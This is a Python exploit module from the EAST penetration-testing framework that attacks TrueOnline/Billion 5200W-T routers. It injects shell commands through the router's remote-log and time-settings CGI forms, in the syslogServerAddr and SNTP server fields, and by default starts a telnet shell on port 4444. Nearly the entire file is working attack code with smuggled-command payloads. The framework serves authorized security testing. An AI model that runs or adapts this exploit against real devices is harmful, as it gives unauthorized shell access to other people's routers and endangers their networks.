#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import urllib2
import base64
from time import sleep

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_trueonline_billion_5200wt_router_rce"
INFO['DESCRIPTION'] = "TrueOnline / Billion 5200W-T Router Unauthenticated Command Injection"
INFO['VENDOR'] = ""
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://packetstormsecurity.com/files/140868/TrueOnline-Billion-5200W-T-Router-Unauthenticated-Command-Injection.html']
INFO["CVE Name"] = ""
INFO["NOTES"] = """TrueOnline is a major ISP in Thailand, and it distributes a customised version of the Billion 5200W-T router. This customised version has at least two command injection vulnerabilities, one authenticated and one unauthenticated, on different firmware versions. This module will attempt to exploit the unauthenticated injection first, and if that fails, it will attempt to exploit the authenticated injection. This module was tested in an emulated environment, as the author doesn't have access to the Thai router any more. Any feedback should be sent directly to the module's author.
There are other language strings in the firmware, so it is likely that this firmware is not only distributed in Thailand. Other Billion 5200W-T in other countries might be vulnerable too."""

INFO['CHANGELOG'] = "02 Feb, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/Hardware/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = "80", dict(description = 'Target port')
OPTIONS["COMMAND"] = 'utelnetd -l /bin/sh -p 4444 -d', dict(description = 'Command')
OPTIONS["USERNAME"] = 'admin', dict(description = 'For auth ')
OPTIONS["PASSWORD"] = 'password', dict(description = 'For auth ')

class exploit(Sploit):
    def __init__(self, host="", port=0, logger=None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        self.command = ""
        self.username = ''
        self.password = ''
    
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.command = self.args.get('COMMAND', self.command)
        self.username = self.args.get('USERNAME', self.username)
        self.password = self.args.get('PASSWORD', self.password)
        
    
    def make_url(self, path = ''):
        return 'http://{}:{}{}'.format(self.host, self.port, path)

    def unauth_exec(self):
        data = 'RemotelogEnable=1&serverPort=514&syslogServerAddr="1.1.1.1;{};#"'.format(self.command)
        request = urllib2.Request(self.make_url('/cgi-bin/adv_remotelog.asp'), data)
        try:
            fd = urllib2.urlopen(request)
        except Exception as e:
                return False
        return True
        
    def auth_exec(self):
        data = "SaveTime=1&uiCurrentTime2=&uiCurrentTime1=&ToolsTimeSetFlag=0&uiRadioValue=0&uiClearPCSyncFlag=0&uiwPCdateMonth=0&uiwPCdateDay=&uiwPCdateYear=&uiwPCdateHour=&uiwPCdateMinute=&uiwPCdateSec=&uiCurTime=N%2FA+%28NTP+server+is+connecting%29&uiTimezoneType=0&uiViewSyncWith=0&uiPCdateMonth=1&uiPCdateDay=&uiPCdateYear=&uiPCdateHour=&uiPCdateMinute=&uiPCdateSec=&uiViewdateToolsTZ=GMT%2B07%3A00&uiViewdateDS=Disable&uiViewSNTPServer=\"%3b{}%26%23&ntp2ServerFlag=N%2FA&ntp3ServerFlag=N%2FA".format(self.command.replace(' ', '+'))
        
        request = urllib2.Request(self.make_url('/'))
        request.add_header('Cookie', "SESSIONID=EASTFRMW")
        try:
            fd = urllib2.urlopen(request)
        except Exception as e:
            pass
            
        sleep(2)
        
        request = urllib2.Request(self.make_url('/cgi-bin/tools_time.asp'), data)
        request.add_header('Cookie', "SESSIONID=EASTFRMW")
        request.add_header('Authorization', "Basic " + base64.b64encode('{}:{}'.format(self.username, self.password)))
        fd = urllib2.urlopen(request)
        
    def run(self):
        self.args()
        
        self.log('Try to use exploit with unauthenticated injection')
        if self.unauth_exec():
            self.finish(True)
        else:
            self.log('Failed. Try to use exploit with authenticated injection')
            try:
                self.auth_exec()
            except Exception as e:
                self.log(e)
                self.finish(False)
        self.finish(True)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()

